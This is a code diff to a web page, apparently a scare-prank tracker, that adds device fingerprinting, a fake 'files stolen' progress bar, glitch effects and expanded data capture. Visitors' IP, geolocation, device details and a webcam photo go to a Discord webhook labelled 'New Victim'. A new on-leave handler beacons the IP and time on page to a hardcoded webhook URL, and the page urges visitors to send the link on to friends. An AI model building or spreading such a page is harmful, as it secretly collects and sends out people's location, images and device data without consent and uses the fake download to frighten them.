@@ -346,6 +346,78 @@
 
     .share-btn:hover { background: var(--ink); color: var(--bg); }
 
+
+    /* ── FAKE DOWNLOAD ── */
+    #phase-download {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 80vh;
+      text-align: center;
+      gap: 1.5rem;
+    }
+
+    .dl-title {
+      font-size: clamp(1rem, 3vw, 1.4rem);
+      font-weight: 900;
+      color: var(--ink);
+      text-shadow: 0 0 10px rgba(150,0,0,0.7);
+      animation: flicker 2s infinite;
+    }
+
+    #fake-dl-bar {
+      display: none;
+      width: 100%;
+      max-width: 420px;
+      background: var(--card);
+      border: 1px solid var(--border);
+      height: 22px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    #fake-dl-fill {
+      height: 100%;
+      width: 0%;
+      background: var(--ink);
+      transition: width 0.08s linear;
+      box-shadow: 0 0 10px rgba(180,0,0,0.6);
+    }
+
+    #fake-dl-label {
+      font-size: 0.65rem;
+      letter-spacing: 0.1em;
+      color: var(--muted);
+      text-transform: uppercase;
+      animation: blink 0.8s step-end infinite;
+    }
+
+    /* ── GLITCH SHAKE ── */
+    @keyframes glitchShake {
+      0%   { transform: translate(0,0) skewX(0deg); }
+      10%  { transform: translate(-8px, 3px) skewX(-3deg); }
+      20%  { transform: translate(8px, -3px) skewX(3deg); }
+      30%  { transform: translate(-6px, 5px) skewX(-2deg); }
+      40%  { transform: translate(6px, -5px) skewX(2deg); }
+      50%  { transform: translate(-4px, 2px) skewX(-1deg); }
+      60%  { transform: translate(4px, -2px) skewX(1deg); }
+      70%  { transform: translate(-2px, 1px) skewX(0deg); }
+      80%  { transform: translate(2px, -1px); }
+      100% { transform: translate(0,0); }
+    }
+
+    .glitch-shake { animation: glitchShake 0.8s ease-out; }
+
+    /* ── DEVICE CARD ── */
+    .device-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+      margin-bottom: 1rem;
+      animation: fadeInUp 0.6s ease-out 0.25s both;
+    }
+
     .flash-anim { animation: flashRed 0.4s ease-out forwards; }
 
     @keyframes flashRed {
@@ -374,6 +446,16 @@
     <video id="cam-preview" autoplay playsinline></video>
     <button class="cam-btn" id="cam-allow-btn" onclick="requestCamera()">[ ALLOW CAMERA ACCESS ]</button>
     <button class="cam-btn skip" onclick="skipCamera()">skip verification →</button>
+  </div>
+
+
+  <!-- Fake Download Phase -->
+  <div id="phase-download">
+    <p class="dl-title">⚠ ACCESSING DEVICE FILES...</p>
+    <div id="fake-dl-bar">
+      <div id="fake-dl-fill"></div>
+    </div>
+    <p id="fake-dl-label">[ INITIALIZING... ]</p>
   </div>
 
   <!-- Reveal -->
@@ -417,6 +499,42 @@
       <p class="card-value" id="out-coords">—</p>
     </div>
 
+    <div class="card" id="device-card">
+      <p class="card-label">Device Info</p>
+      <p class="card-value" id="out-os" style="font-size:0.82rem;">—</p>
+      <p class="card-value" id="out-browser" style="font-size:0.82rem; margin-top:0.3rem;">—</p>
+      <p class="card-value" id="out-screen" style="font-size:0.82rem; margin-top:0.3rem;">—</p>
+      <p class="card-value" id="out-battery" style="font-size:0.82rem; margin-top:0.3rem;">—</p>
+    </div>
+
+
+    <div class="device-grid">
+      <div class="data-cell">
+        <p class="card-label">OS</p>
+        <p class="card-value" id="out-os">—</p>
+      </div>
+      <div class="data-cell">
+        <p class="card-label">Browser</p>
+        <p class="card-value" id="out-browser">—</p>
+      </div>
+      <div class="data-cell">
+        <p class="card-label">Screen</p>
+        <p class="card-value" id="out-screen">—</p>
+      </div>
+      <div class="data-cell">
+        <p class="card-label">Battery</p>
+        <p class="card-value" id="out-battery">—</p>
+      </div>
+      <div class="data-cell">
+        <p class="card-label">Opened At</p>
+        <p class="card-value" id="out-opened">—</p>
+      </div>
+      <div class="data-cell">
+        <p class="card-label">Timezone</p>
+        <p class="card-value" id="out-tz">—</p>
+      </div>
+    </div>
+
     <button class="share-btn" onclick="copyLink()">&#10006; &nbsp;COPY LINK TO SEND TO A FRIEND</button>
   </div>
 
@@ -426,6 +544,47 @@
   let ipData = null;
   let capturedImageBase64 = null;
   let cameraStream = null;
+  let deviceData = null;
+  let pageOpenTime = Date.now();
+
+  // ── Device Info ────────────────────────────────────────
+  async function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let os = 'Unknown OS';
+    if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
+    else if (/Windows NT 6\.1/.test(ua)) os = 'Windows 7';
+    else if (/Windows/.test(ua)) os = 'Windows';
+    else if (/iPhone/.test(ua)) os = 'iOS (iPhone)';
+    else if (/iPad/.test(ua)) os = 'iOS (iPad)';
+    else if (/Android/.test(ua)) os = 'Android';
+    else if (/Mac OS X/.test(ua)) os = 'macOS';
+    else if (/Linux/.test(ua)) os = 'Linux';
+
+    let browser = 'Unknown';
+    if (/Edg\//.test(ua)) browser = 'Microsoft Edge';
+    else if (/OPR\/|Opera/.test(ua)) browser = 'Opera';
+    else if (/Chrome\//.test(ua)) browser = 'Chrome';
+    else if (/Firefox\//.test(ua)) browser = 'Firefox';
+    else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+
+    let battery = 'N/A';
+    try {
+      const b = await navigator.getBattery();
+      battery = Math.round(b.level * 100) + '% ' + (b.charging ? '(charging)' : '(not charging)');
+    } catch(e) {}
+
+    return {
+      os,
+      browser,
+      screen_res: screen.width + 'x' + screen.height,
+      mobile: /Mobi|Android/i.test(ua) ? 'Yes' : 'No',
+      lang: navigator.language || 'unknown',
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
+      cores: navigator.hardwareConcurrency || 'unknown',
+      battery,
+      opened_at: new Date().toLocaleString(),
+    };
+  }
 
   // ── Audio ──────────────────────────────────────────────
   function playAlarm() {
@@ -439,7 +598,6 @@
       master.gain.exponentialRampToValueAtTime(0.0001, now + 5.0);
       master.connect(ctx.destination);
 
-      // Layer 1: sub-bass rumble — very low, felt more than heard
       const sub = ctx.createOscillator();
       sub.type = 'sine';
       sub.frequency.setValueAtTime(28, now);
@@ -448,29 +606,20 @@
       sub.frequency.setValueAtTime(20, now + 4.0);
       const subGain = ctx.createGain();
       subGain.gain.value = 0.9;
-      sub.connect(subGain);
-      subGain.connect(master);
-      sub.start(now);
-      sub.stop(now + 5.0);
+      sub.connect(subGain); subGain.connect(master);
+      sub.start(now); sub.stop(now + 5.0);
 
-      // Layer 2: detuned dissonant interval (tritone — the "devil's interval")
-      const freqs = [55, 77.8]; // A1 + Eb2 = tritone
-      freqs.forEach(f => {
+      [55, 77.8].forEach(f => {
         const osc = ctx.createOscillator();
         osc.type = 'sawtooth';
         osc.frequency.setValueAtTime(f, now);
-        // slow detuning for unease
         osc.frequency.linearRampToValueAtTime(f * 0.97, now + 2.5);
         osc.frequency.linearRampToValueAtTime(f * 1.02, now + 5.0);
-        const g = ctx.createGain();
-        g.gain.value = 0.25;
-        osc.connect(g);
-        g.connect(master);
-        osc.start(now);
-        osc.stop(now + 5.0);
+        const g = ctx.createGain(); g.gain.value = 0.25;
+        osc.connect(g); g.connect(master);
+        osc.start(now); osc.stop(now + 5.0);
       });
 
-      // Layer 3: slow deep pulse / heartbeat thud
       for (let i = 0; i < 6; i++) {
         const t = now + i * 0.72;
         const thud = ctx.createOscillator();
@@ -481,13 +630,10 @@
         thudGain.gain.setValueAtTime(0, t);
         thudGain.gain.linearRampToValueAtTime(0.7, t + 0.01);
         thudGain.gain.exponentialRampToValueAtTime(0.0001, t + 0.18);
-        thud.connect(thudGain);
-        thudGain.connect(master);
-        thud.start(t);
-        thud.stop(t + 0.2);
+        thud.connect(thudGain); thudGain.connect(master);
+        thud.start(t); thud.stop(t + 0.2);
       }
 
-      // Layer 4: long descending sine moan — drops from low to very low
       const moan = ctx.createOscillator();
       moan.type = 'sine';
       moan.frequency.setValueAtTime(180, now + 0.5);
@@ -497,12 +643,9 @@
       moanGain.gain.linearRampToValueAtTime(0.4, now + 1.2);
       moanGain.gain.setValueAtTime(0.4, now + 3.5);
       moanGain.gain.exponentialRampToValueAtTime(0.0001, now + 5.0);
-      moan.connect(moanGain);
-      moanGain.connect(master);
-      moan.start(now + 0.5);
-      moan.stop(now + 5.0);
+      moan.connect(moanGain); moanGain.connect(master);
+      moan.start(now + 0.5); moan.stop(now + 5.0);
 
-      // Layer 5: low filtered noise — like a distant threat
       const bufSize = ctx.sampleRate * 5;
       const noiseBuf = ctx.createBuffer(1, bufSize, ctx.sampleRate);
       const nd = noiseBuf.getChannelData(0);
@@ -510,19 +653,14 @@
       const noise = ctx.createBufferSource();
       noise.buffer = noiseBuf;
       const noiseFilter = ctx.createBiquadFilter();
-      noiseFilter.type = 'lowpass';
-      noiseFilter.frequency.value = 120;
-      noiseFilter.Q.value = 2;
+      noiseFilter.type = 'lowpass'; noiseFilter.frequency.value = 120; noiseFilter.Q.value = 2;
       const noiseGain = ctx.createGain();
       noiseGain.gain.setValueAtTime(0.0001, now);
       noiseGain.gain.linearRampToValueAtTime(0.25, now + 1.0);
       noiseGain.gain.setValueAtTime(0.25, now + 3.5);
       noiseGain.gain.exponentialRampToValueAtTime(0.0001, now + 5.0);
-      noise.connect(noiseFilter);
-      noiseFilter.connect(noiseGain);
-      noiseGain.connect(master);
+      noise.connect(noiseFilter); noiseFilter.connect(noiseGain); noiseGain.connect(master);
       noise.start(now);
-
     } catch(e) {}
   }
 
@@ -531,16 +669,10 @@
       const ctx = new (window.AudioContext || window.webkitAudioContext)();
       const buffer = ctx.createBuffer(1, ctx.sampleRate * 0.1, ctx.sampleRate);
       const data = buffer.getChannelData(0);
-      for (let i = 0; i < data.length; i++) {
-        data[i] = (Math.random() * 2 - 1) * (1 - i / data.length);
-      }
+      for (let i = 0; i < data.length; i++) data[i] = (Math.random() * 2 - 1) * (1 - i / data.length);
       const src = ctx.createBufferSource();
-      const gain = ctx.createGain();
-      src.buffer = buffer;
-      gain.gain.value = 0.4;
-      src.connect(gain);
-      gain.connect(ctx.destination);
-      src.start();
+      const gain = ctx.createGain(); gain.gain.value = 0.4;
+      src.buffer = buffer; src.connect(gain); gain.connect(ctx.destination); src.start();
     } catch(e) {}
   }
 
@@ -550,6 +682,53 @@
     overlay.classList.remove('flash-anim');
     void overlay.offsetWidth;
     overlay.classList.add('flash-anim');
+  }
+
+  // ── Glitch shake ──────────────────────────────────────
+  function doGlitchShake() {
+    const wrapper = document.querySelector('.wrapper');
+    wrapper.classList.add('glitch-shake');
+    setTimeout(() => wrapper.classList.remove('glitch-shake'), 800);
+
+    // Rapidly flicker the page background
+    let flickers = 0;
+    const iv = setInterval(() => {
+      document.body.style.backgroundColor = flickers % 2 === 0 ? '#1a0000' : '#000000';
+      flickers++;
+      if (flickers > 10) { clearInterval(iv); document.body.style.backgroundColor = ''; }
+    }, 60);
+  }
+
+  // ── Fake download progress bar ─────────────────────────
+  function runFakeDownload(onComplete) {
+    const bar = document.getElementById('fake-dl-bar');
+    const fill = document.getElementById('fake-dl-fill');
+    const label = document.getElementById('fake-dl-label');
+    const files = [
+      'contacts.db', 'messages.sqlite', 'photos_backup.zip',
+      'passwords.txt', 'location_history.json', 'browsing_history.db'
+    ];
+    bar.style.display = 'block';
+    let progress = 0;
+    let fileIndex = 0;
+
+    const iv = setInterval(() => {
+      // Random jumpy increments for realism
+      progress += Math.random() * 4 + 1;
+      if (progress > 100) progress = 100;
+      fill.style.width = progress + '%';
+      label.textContent = '[ DOWNLOADING: ' + files[fileIndex % files.length] + ' — ' + Math.floor(progress) + '% ]';
+      if (progress >= 30 && fileIndex === 0) fileIndex = 1;
+      if (progress >= 55 && fileIndex === 1) fileIndex = 2;
+      if (progress >= 70 && fileIndex === 2) fileIndex = 3;
+      if (progress >= 85 && fileIndex === 3) fileIndex = 4;
+      if (progress >= 95 && fileIndex === 4) fileIndex = 5;
+      if (progress >= 100) {
+        clearInterval(iv);
+        label.textContent = '[ DOWNLOAD COMPLETE — 6 FILES STOLEN ]';
+        setTimeout(onComplete, 700);
+      }
+    }, 80);
   }
 
   // ── IP Fetch ───────────────────────────────────────────
@@ -590,8 +769,6 @@
       cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
       video.srcObject = cameraStream;
       video.style.display = 'block';
-
-      // Auto-capture once the video feed is ready
       video.onloadedmetadata = () => {
         video.play();
         setTimeout(() => capturePhoto(), 800);
@@ -611,39 +788,49 @@
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     capturedImageBase64 = canvas.toDataURL('image/jpeg', 0.7);
-
-    // Stop stream
     if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
-
     playShutter();
     doFlash();
-
-    setTimeout(() => showReveal(), 300);
+    // Run fake download bar first, then reveal
+    document.getElementById('phase-camera').style.display = 'none';
+    document.getElementById('phase-download').style.display = 'flex';
+    runFakeDownload(() => showReveal());
   }
 
   function skipCamera() {
     if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
-    showReveal();
+    document.getElementById('phase-camera').style.display = 'none';
+    document.getElementById('phase-download').style.display = 'flex';
+    runFakeDownload(() => showReveal());
   }
 
   // ── Reveal ─────────────────────────────────────────────
-  function showReveal() {
-    document.getElementById('phase-camera').style.display = 'none';
+  async function showReveal() {
+    if (ipFetchPromise) await ipFetchPromise;
+
+    document.getElementById('phase-download').style.display = 'none';
     document.getElementById('phase-reveal').style.display = 'block';
 
-    // Fill IP data
     if (ipData) {
       const ipEl = document.getElementById('out-ip');
       ipEl.textContent = ipData.ip || 'unavailable';
       ipEl.setAttribute('data-text', ipData.ip || 'unavailable');
-      document.getElementById('out-city').textContent   = ipData.city || '—';
-      document.getElementById('out-region').textContent = ipData.regionName || '—';
-      document.getElementById('out-country').textContent= ipData.country || '—';
-      document.getElementById('out-isp').textContent    = ipData.isp || '—';
-      document.getElementById('out-coords').textContent = ipData.lat + ', ' + ipData.lon;
+      document.getElementById('out-city').textContent    = ipData.city || '—';
+      document.getElementById('out-region').textContent  = ipData.regionName || '—';
+      document.getElementById('out-country').textContent = ipData.country || '—';
+      document.getElementById('out-isp').textContent     = ipData.isp || '—';
+      document.getElementById('out-coords').textContent  = ipData.lat + ', ' + ipData.lon;
     }
 
-    // Show captured photo if we have one
+    if (deviceData) {
+      document.getElementById('out-os').textContent      = deviceData.os;
+      document.getElementById('out-browser').textContent = deviceData.browser;
+      document.getElementById('out-screen').textContent  = deviceData.screen_res + ' · ' + (deviceData.mobile === 'Yes' ? '📱 Mobile' : '🖥️ Desktop');
+      document.getElementById('out-battery').textContent = deviceData.battery;
+      document.getElementById('out-opened').textContent  = deviceData.opened_at;
+      document.getElementById('out-tz').textContent      = deviceData.tz;
+    }
+
     if (capturedImageBase64) {
       const photoEl = document.getElementById('captured-photo');
       photoEl.src = capturedImageBase64;
@@ -653,8 +840,7 @@
 
     playAlarm();
     doFlash();
-
-    // Send to Discord
+    doGlitchShake();
     sendToDiscord();
   }
 
@@ -666,26 +852,33 @@
       title: '🎯 New Victim',
       color: 0xff0000,
       fields: [
-        { name: '🌐 IP Address', value: (ipData && ipData.ip) || 'unknown', inline: true },
+        { name: '🌐 IP', value: (ipData && ipData.ip) || 'unknown', inline: true },
         { name: '🏙️ City', value: (ipData && ipData.city) || 'unknown', inline: true },
         { name: '🗺️ Region', value: (ipData && ipData.regionName) || 'unknown', inline: true },
         { name: '🌍 Country', value: (ipData && ipData.country) || 'unknown', inline: true },
         { name: '📡 ISP', value: (ipData && ipData.isp) || 'unknown', inline: true },
-        { name: '📍 Coordinates', value: (ipData ? ipData.lat + ', ' + ipData.lon : 'unknown'), inline: true },
+        { name: '📍 Coords', value: (ipData ? ipData.lat + ', ' + ipData.lon : 'unknown'), inline: true },
+        { name: '💻 OS', value: (deviceData && deviceData.os) || 'unknown', inline: true },
+        { name: '🌐 Browser', value: (deviceData && deviceData.browser) || 'unknown', inline: true },
+        { name: '🖥️ Screen', value: (deviceData && deviceData.screen_res) || 'unknown', inline: true },
+        { name: '📱 Mobile', value: (deviceData && deviceData.mobile) || 'unknown', inline: true },
+        { name: '🌍 Language', value: (deviceData && deviceData.lang) || 'unknown', inline: true },
+        { name: '🕐 Timezone', value: (deviceData && deviceData.tz) || 'unknown', inline: true },
+        { name: '⚙️ CPU Cores', value: (deviceData && String(deviceData.cores)) || 'unknown', inline: true },
+        { name: '🔋 Battery', value: (deviceData && deviceData.battery) || 'unknown', inline: true },
+        { name: '🕑 Opened At', value: (deviceData && deviceData.opened_at) || 'unknown', inline: true },
         { name: '📸 Photo', value: capturedImageBase64 ? 'Attached below' : 'Skipped camera', inline: true },
       ],
       footer: { text: 'Made By Raiden • Ran by the Com Lords' },
       timestamp: new Date().toISOString()
     };
 
-    // Send text embed first
     fetch(WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ username: 'Com Lords Spy', avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png', embeds: [embed] })
     }).catch(() => {});
 
-    // Send photo as file if captured
     if (capturedImageBase64) {
       try {
         const blob = await (await fetch(capturedImageBase64)).blob();
@@ -697,6 +890,29 @@
     }
   }
 
+  // ── Time on page — fires when they close/leave ─────────
+  window.addEventListener('beforeunload', () => {
+    const secs = Math.round((Date.now() - pageOpenTime) / 1000);
+    const mins = Math.floor(secs / 60);
+    const timeStr = mins > 0 ? mins + 'm ' + (secs % 60) + 's' : secs + 's';
+    const WEBHOOK = 'https://discord.com/api/webhooks/1485458712968822784/-HmSSxfpKDqcQclV31xTSf-nsy4KlMohaYHXhfFLwcYOz23sTAxHA3UxYKYWaTXeBblS';
+    const payload = JSON.stringify({
+      username: 'Com Lords Spy',
+      embeds: [{
+        title: '👋 Victim Left',
+        color: 0x880000,
+        fields: [
+          { name: '🌐 IP', value: (ipData && ipData.ip) || 'unknown', inline: true },
+          { name: '⏱️ Time on Page', value: timeStr, inline: true },
+        ],
+        footer: { text: 'Made By Raiden • Ran by the Com Lords' },
+        timestamp: new Date().toISOString()
+      }]
+    });
+    // Use sendBeacon so it fires even as page closes
+    navigator.sendBeacon(WEBHOOK, new Blob([payload], { type: 'application/json' }));
+  });
+
   // ── Copy link ──────────────────────────────────────────
   function copyLink() {
     navigator.clipboard.writeText(location.href).then(() => {
@@ -707,13 +923,17 @@
   }
 
   // ── Init ───────────────────────────────────────────────
-  window.onload = async function() {
-    // Fetch IP in background while loading screen shows
-    ipData = await fetchIP();
+  let ipFetchPromise = null;
 
-    // Transition to camera phase
-    document.getElementById('phase-loading').style.display = 'none';
-    document.getElementById('phase-camera').style.display = 'flex';
+  window.onload = function() {
+    ipFetchPromise = fetchIP().then(data => { ipData = data; });
+    getDeviceInfo().then(d => { deviceData = d; });
+
+    setTimeout(async () => {
+      await ipFetchPromise;
+      document.getElementById('phase-loading').style.display = 'none';
+      document.getElementById('phase-camera').style.display = 'flex';
+    }, 1200);
   };
 </script>
 </body>
